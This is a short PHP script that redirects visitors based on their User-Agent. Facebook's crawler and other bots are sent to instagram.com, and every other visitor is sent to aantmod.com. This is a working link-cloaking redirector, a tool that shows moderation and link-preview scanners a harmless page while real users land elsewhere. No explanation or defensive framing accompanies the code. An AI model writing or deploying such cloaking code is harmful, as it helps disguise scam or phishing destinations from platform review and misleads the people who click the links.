<?php
$a = 'https://www.instagram.com/';
$b = 'https://aantmod.com/';

redirectUserBasedOnAgent($a, $b);

function redirectUserBasedOnAgent($botUrl, $defaultUrl) {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    
    if (isBot($userAgent)) {
        header('Location: ' . $botUrl);
    } else {
        header('Location: ' . $defaultUrl);
    }
    exit;
}

function isBot($userAgent) {
    $botIndicators = ['facebook', 'bot', 'Bot'];
    
    foreach ($botIndicators as $indicator) {
        if (strpos($userAgent, $indicator) !== false) {
            return true;
        }
    }
    
    return false;
}
?>
